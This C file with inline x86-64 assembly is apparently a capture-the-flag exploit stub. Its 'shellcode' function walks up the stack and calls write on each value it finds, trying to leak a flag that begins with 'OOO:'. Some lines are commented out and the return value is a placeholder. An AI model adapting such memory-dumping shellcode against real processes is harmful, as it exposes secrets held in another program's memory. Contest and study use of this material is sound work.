#include <stdio.h>
#include <unistd.h>

#define ADDR_MIN   0x0000100000000000UL
#define ADDR_MASK  0x00000ffffffff000UL


void *shellcode()
{
    // 1. Find the secret in memory (starts with "OOO:")
    // 2. Print it
    // 3. ...
    // 4. PROFIT!



    asm(".intel_syntax noprefix");
    asm("xor r8, r8");
    asm("mov r9, rsp");
//    asm("sub rsi, 0x1d000");

    asm("loop:");
    asm("inc r8");
    //asm("mov rbx, r8");
    //asm("shl rbx, 3");
    //asm("add rsi, rbx");
    asm("add r9, 8");
    asm("mov rsi, [r9]");
    asm("mov rdi, 1");
    asm("mov rax, 1");
    asm("mov rdx, 100");
    asm("mov rcx, 100");
    asm("syscall");
    asm("cmp r8, 15");
    asm("jl loop");
    return (void*) 0x123455; // For this simplified test it's also OK to return the address
}
